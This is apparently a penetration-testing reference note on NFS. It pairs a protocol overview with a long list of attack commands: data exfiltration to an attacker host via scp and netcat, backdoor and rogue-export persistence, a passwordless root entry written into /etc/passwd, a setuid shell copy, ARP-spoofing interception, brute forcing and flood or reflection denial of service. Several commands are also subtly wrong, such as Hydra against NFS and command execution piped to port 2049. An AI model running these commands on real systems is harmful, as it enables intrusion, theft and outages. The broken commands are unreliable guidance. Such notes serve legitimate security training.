# Index
- [[Ports, Protocols, and Services]]

# Network File System (NFS)

- **Port Number:** 2049 (default)
- **Protocol:** TCP/UDP
- **Service Name:** Network File System (NFS)
- **Defined in:** RFC 1094 (NFSv2), RFC 1813 (NFSv3), RFC 7530 (NFSv4)

NFS (Network File System) is a distributed file system protocol that allows a computer to access files over a network as if they were on its local storage. Developed by Sun Microsystems in 1984, NFS enables the sharing of files and directories between systems over a network, supporting both TCP and UDP protocols, with TCP being more commonly used in modern implementations. NFS allows for central management of files, making it a fundamental tool in many enterprise environments where file sharing across multiple machines is necessary.

## Overview of Features

- **File Sharing Across Networks:** NFS allows multiple clients to access shared files on a remote server, appearing as if they were part of the local file system.

- **Statelessness:** Earlier versions of NFS (NFSv2, NFSv3) are stateless, meaning the server does not maintain information about client sessions. This simplifies recovery in case of failure but requires the client to resend information if an operation is interrupted.

- **Authentication and Security:** NFSv4 introduced stronger security features, including support for Kerberos-based authentication, ACLs (Access Control Lists), and encryption.

- **Mount Protocol (MOUNT):** NFS uses the MOUNT protocol to allow a client to request a mount operation from the server, enabling access to the server's file system.

- **File Locking:** Although earlier versions of NFS had limited support for file locking, NFSv4 integrated a more robust locking mechanism to prevent data corruption in concurrent environments.

- **Support for Multiple Versions:** NFSv2, NFSv3, and NFSv4 are the most commonly used versions, with NFSv4 being the most secure and feature-rich.

## Typical Use Cases

- **Centralized File Storage:** NFS is commonly used in environments where multiple clients need access to a centralized storage location, such as in academic institutions, businesses, and cloud environments.

- **Home Directories:** In Unix/Linux environments, user home directories can be hosted on NFS servers, allowing users to access their files from any client machine.

- **Shared Application Data:** Applications that need to share data between multiple instances can use NFS to ensure all instances have access to the same data.

- **Backup Solutions:** NFS can be used to centralize backups, with data from multiple clients stored on an NFS server for easier management and recovery.

## How NFS Works

1. **NFS Server Setup:**
   - **Step 1:** The NFS server is configured to export (share) specific directories to clients. These exports are defined in the `/etc/exports` file.
   - **Step 2:** The NFS server starts services such as `nfsd`, `mountd`, and `rpcbind` to manage file system requests, mount requests, and RPC (Remote Procedure Call) communications.

2. **Client-Side Mounting:**
   - **Step 3:** The client system uses the `mount` command or `/etc/fstab` to mount the exported NFS directories. The client specifies the NFS server IP, the shared directory, and the local mount point.
   - **Step 4:** The client sends a mount request to the NFS server via the MOUNT protocol. The server checks the `/etc/exports` file to determine if the client is allowed to access the requested directory.

3. **File Access:**
   - **Step 5:** Once the directory is mounted, the client can access files as if they were local. The client sends requests (e.g., read, write) to the NFS server using the NFS protocol.
   - **Step 6:** The server processes these requests and returns the requested data or performs the requested operation (e.g., writing a file).

4. **File Locking:**
   - **Step 7:** If a file needs to be locked, the client requests a lock via the NLM (Network Lock Manager) or in NFSv4 directly through the NFS protocol. This prevents other clients from modifying the file while it's locked.
   - **Step 8:** The server grants or denies the lock based on the current state of the file and returns the result to the client.

5. **File System Operations:**
   - **Step 9:** Common file system operations like creating, deleting, or renaming files are handled by the NFS protocol in a similar manner to local file operations, with requests sent to the server and responses returned to the client.

6. **Unmounting the File System:**
   - **Step 10:** When the client is finished with the NFS share, it can unmount the file system using the `umount` command. The client informs the server that it no longer needs access to the exported directory.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` mounts `<target_ip>`:/share to /mnt/share
- **Server:** `<target_ip>` provides access to /share as defined in `/etc/exports`
- **Client:** `<attack_ip>` accesses /mnt/share as if it were local

# Additional Information

## Security Considerations
- **Authentication and Access Control:** NFSv4 provides more secure authentication methods, including Kerberos, and supports fine-grained access control using ACLs. However, earlier versions rely heavily on client-side enforcement of permissions, which can be easily bypassed if an attacker gains control of a client machine.

- **Network Security:** NFS traffic is typically unencrypted, making it vulnerable to eavesdropping. Secure NFS configurations should use NFSv4 with Kerberos or wrap NFS traffic in a secure tunnel (e.g., SSH or VPN).

- **Root Squashing:** A security feature where the root user on the client is mapped to a non-privileged user on the server to prevent unauthorized root-level access to files. This is a common configuration option in `/etc/exports`.

## Performance Tuning
- **Async vs. Sync:** The server can be configured to write data asynchronously or synchronously. Async mode provides better performance but at the cost of potential data loss during a crash. Sync mode is safer but slower.

- **Rsize and Wsize:** These options control the maximum size of data chunks that can be read or written at once. Tuning these parameters can improve performance based on network conditions.

## NFS Versions
- **NFSv2:** The original version, which is simple but limited in features, including 32-bit file sizes and no support for strong authentication or file locking.
- **NFSv3:** Introduced support for larger files, asynchronous writes, and improvements in performance. Still widely used but lacks built-in security features.
- **NFSv4:** Includes integrated security features, support for stateful operations, improved file locking, and better performance over WANs. It is the recommended version for modern deployments.

## Common NFS Services
- **rpcbind:** Maps RPC services to the correct ports.
- **nfsd:** Handles NFS requests from clients.
- **mountd:** Manages mount requests from clients.
- **statd:** Handles NFS lock recovery after a server crash.

## Configuration Files

1. **Exports Configuration:**
  - **File Location:** `/etc/exports`
  - **Configuration Example:**
    ```bash
    /srv/nfs/share <client_ip>(rw,sync,no_subtree_check,no_root_squash)
    ```
  - **Key Settings:**
    - `rw`: Read/write access.
    - `sync`: Forces synchronous writes.
    - `no_subtree_check`: Disables subtree checking, improving performance.
    - `no_root_squash`: Allows root access from the client.

2. **NFS Daemon Configuration:**
  - **File Location:** `/etc/nfs.conf`
  - **Configuration Example:**
    ```bash
    [nfsd]
    threads=8
    [mountd]
    manage_gids=n
    ```
  - **Key Settings:**
    - `threads`: Number of threads for NFS daemon.
    - `manage_gids`: Enable management of group IDs.

3. - **Fstab Configuration:**
  - **File Location:** `/etc/fstab`
  - **Configuration Example:**
    ```bash
    <target_ip>:/srv/nfs/share /mnt/share nfs defaults,rsize=8192,wsize=8192,timeo=14 0 0
    ```
  - **Key Settings:**
    - `rsize`: Read size.
    - `wsize`: Write size.
    - `timeo`: Timeout setting for NFS operations.

## Potential Misconfigurations

1. **No_root_squash Enabled:**
   - **Risk:** Enabling `no_root_squash` allows the root user on the client to have root privileges on the NFS server, which could lead to unauthorized access.
   - **Exploitation:** An attacker who gains root access on a client machine can access and modify sensitive files on the NFS server with full privileges.

2. **Insecure Exports:**
   - **Risk:** Configuring NFS exports with overly permissive settings (e.g., `*(rw,no_subtree_check)`) allows any client to mount the share, potentially exposing sensitive data.
   - **Exploitation:** An attacker can mount the NFS share from an unauthorized machine and gain access to the files.

3. **Unencrypted Traffic:**
   - **Risk:** NFS traffic is typically unencrypted, making it susceptible to interception and man-in-the-middle attacks.
   - **Exploitation:** An attacker can capture or alter NFS traffic to steal sensitive information or disrupt operations.

4. **No Authentication:**
   - **Risk:** NFSv2 and NFSv3 do not require authentication, relying on client-side enforcement of permissions.
   - **Exploitation:** An attacker could spoof an authorized client IP to gain access to NFS shares.

## Default Credentials

NFS does not involve user authentication at the protocol level (in NFSv2/NFSv3) and relies on client-side user identity for permission management. There are no default credentials for NFS itself. However, NFSv4 with Kerberos can use Kerberos credentials, which should be configured securely.

# Interaction and Tools

## Tools

### Mount
- **Mounting an NFS Share:** This command mounts the NFS share from the server to the local directory `/mnt`.
	```bash
	mkdir target-NFS
	sudo mount -t nfs <target_ip>:/srv/nfs/share /mnt/share
	cd target-NFS
	tree .
	```
- **Mounting with Kerberos Authentication (NFSv4):** Mounts the NFSv4 share using Kerberos authentication.
	```bash
	mount -t nfs4 -o sec=krb5 <target_ip>:/srv/nfs/share /mnt/share
	```
- **Automounting NFS Shares via Fstab:** Automatically mounts the NFS share on boot using `/etc/fstab`.
	```bash
	<target_ip>:/srv/nfs/share /mnt/share nfs defaults 0 0
	```
- **Mounting with Specific Options:** Mounts the NFS share with read/write access and synchronous writes.
	```bash
	mount -t nfs -o rw,sync <target_ip>:/srv/nfs/share /mnt/share
	```
- **Unmounting an NFS Share:** This command unmounts the NFS share from the local directory `/mnt`.
	```bash
	cd ..
	sudo umount ./target-NFS
	```
- **Show Available NFS Shares :** This command lists all the directories shared by the NFS server.
	```bash
	showmount -e <server_ip>
	```
- **List Contents with Usernames and Group Names:**
	```bash
	ls -l mnt/nfs/
	```
- **List Contents with UIDs and GUIDs:**
	```bash
	ls -n mnt/nfs/
	```
- **Root:** Some directories may have restricted permissions use root to attempt to bypass.
	```bash
	su root
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 2049"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 2049
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 2049
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 2049 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 2049
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 2049 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:2049
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 2049
    ```

## [[Impacket]]

### [[Impacket-NFSShell]]
- **Connect to NFS Share:**
	```bash
	impacket-nfsshell <server_ip>:/path/to/share
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 2049
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 2049
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Exploiting Insecure Exports
- **Tool:** [[Mount]]
    ```bash
    mount -t nfs <target_ip>:/srv/nfs/share /mnt/share
    ```
- **Description:** Mount insecurely exported NFS shares and gain unauthorized access to the file system.

### File Manipulation
- **Tool:** Manual Interaction
	```bash
	echo "malicious content" > /mnt/target_file
	```
- **Description:** Modify files on the NFS share to introduce backdoors or other malicious content.

### Unauthorized Access Exploit
- **Tool:**  Manual Configuration
	```bash
	/export *(rw,sync,no_subtree_check)
	```
- **Description:** Allowing access from any IP address can lead to unauthorized access. This configuration allows any client to mount the NFS share, leading to potential data exposure.

## Persistence

### Backdoor Deployment via NFS
- **Tool:** Manual Configuration
	```bash
	cp /path/to/backdoor /mnt/target_directory/
	```
- **Description:** Upload a persistent backdoor to the NFS share, allowing future access.

### Creating Rogue NFS Exports
- **Tool:** Manual Configuration
	```bash
	echo "/malicious_export *(rw,no_root_squash)" >> /etc/exports
	exportfs -a
	```
- **Description:** Modify the NFS server’s exports to create a rogue export, which can be used to host or distribute malicious files.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 2049"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

## Privilege Escalation

### Exploiting No Root Squash
- **Tool:**  Manual Configuration
	```bash
	echo "root::0:0::/root:/bin/bash" > /mnt/nfs/etc/passwd
	```

	```bash
	touch /mnt/nfs/root_owned_file
	chown root:root /mnt/nfs/root_owned_file
	```
- **Description:** If `no_root_squash` is enabled, exploit this to gain root access by creating files with root privileges. When `no_root_squash` is enabled, clients can operate as root on the NFS server.

### Exploiting No Root Squash
- **Tool:** [[Mount]]
    ```bash
    mount -o rw,vers=3 <target_ip>:/srv/nfs/share /mnt/share
    cd /mnt/share
    touch root_owned_file
    ```

	```bash
	sudo mount -t nfs <target_ip>:/exported_directory /mnt
	```
- **Description:** If the NFS share is configured with `no_root_squash`, escalate privileges by gaining root access to the file system.

### Root Squashing Bypass Exploit
- **Tool:**  Manual Configuration
	```bash
	/export 192.168.1.0/24(rw,no_root_squash)
	```
- **Description:** Improperly configured `root_squash` settings can allow root access to the NFS server. This configuration does not squash root privileges, allowing clients to perform actions as the root user.

### Abusing NFS Permissions
- **Tool:** Manual Configuration
	```bash
	chown root:root /mnt/target_file
	chmod 4777 /mnt/target_file
	```
- **Description:** Change ownership and permissions on critical files to elevate privileges on the target system.

## Internal Reconnaissance

### Enumerating Mounted Shares
- **Tool:** [[Mount]]
	```bash
	mount | grep nfs
	df -h | grep nfs
	```
- **Description:** Identify NFS shares mounted within the target environment, potentially leading to further exploitation.

## Defense Evasion

### Hiding Malicious Files on NFS
- **Tool:** Manual Configuration
    ```bash
    mv /mnt/share/normal_file /mnt/share/.hidden_file
    ```
- **Description:** Hide malicious files within NFS shares using Unix file hiding techniques.

## Data Exfiltration

### Exfiltrating Data via NFS
- **Tool:** [[Mount]], [[SCP]]
    ```bash
    scp /mnt/share/secret_data.txt <attack_ip>:/stolen_data/
    ```
- **Description:** Exfiltrate data stored on NFS shares to a remote attacker-controlled server.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra mount://<target_ip> -s 2049 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra mount://<target_ip> -s 2049 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 2049 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 2049 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

# Exploits 

### NFSv3 No Root Squash Exploit
- **Tool:** [[Metasploit]]
	```bash
	exploit/linux/nfs/nfsmount
	```
- **Description:** Exploit NFSv3 configurations that allow root access to the file system.

### NFS Directory Traversal
- **Tool:** Custom Scripts
    ```bash
    cd /mnt/share/../../etc
    cat passwd
    ```
- **Description:** Exploit directory traversal vulnerabilities in NFS to access restricted files.

### Remote Code Execution via NFS
- **Tool:** Manual Configuration
	```bash
	cp /bin/bash /mnt/nfs/bash
	chmod +s /mnt/nfs/bash
	```
- **Description:** Misconfigured `exports` and improper permissions can lead to remote code execution by placing executables in writable directories.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 1094 (NFSv2)|https://tools.ietf.org/html/rfc1094|
|RFC 1813 (NFSv3)|https://tools.ietf.org/html/rfc1813|
|RFC 7530 (NFSv4)|https://tools.ietf.org/html/rfc7530|
|NFS Server Configuration Guide|https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/storage_administration_guide/ch-nfs|
|Nmap NFS Scripts|https://nmap.org/nsedoc/categories/nfs.html|
|showmount Documentation|https://linux.die.net/man/8/showmount|
|rpcinfo Documentation|https://linux.die.net/man/8/rpcinfo|
|Metasploit NFS Modules|https://www.rapid7.com/db/modules/|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Linux man-pages|https://man7.org/linux/man-pages/|